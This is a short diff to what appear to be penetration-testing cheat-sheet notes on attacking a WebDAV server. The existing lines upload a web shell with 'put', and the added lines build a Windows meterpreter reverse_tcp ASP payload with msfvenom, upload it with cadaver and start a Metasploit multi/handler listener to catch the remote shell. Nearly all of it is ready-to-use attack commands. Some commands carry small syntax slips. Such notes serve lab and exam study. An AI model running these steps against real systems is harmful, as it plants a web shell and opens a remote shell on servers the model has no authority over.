@@ -26,3 +26,11 @@ Enter credentials
 **Uploading Webshell**  
 Web shells located -- /usr/share/webshells  
 ```put /usr/share/webshells/(file type)/webshell.(filetype)```  
+
+# Metasploit  
+Generating an asp payload  
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Local IP address) LPORT=1234 -f asp > shell.asp```  
+Upload shell using cadaver (previous 2 steps)  
+### Setup a listener  
+Start postgresql services - ```services postgresql start && msfconsole```  
+Use multi/handler  - ```set payload/windows/meterpreter/reverse_tcp```
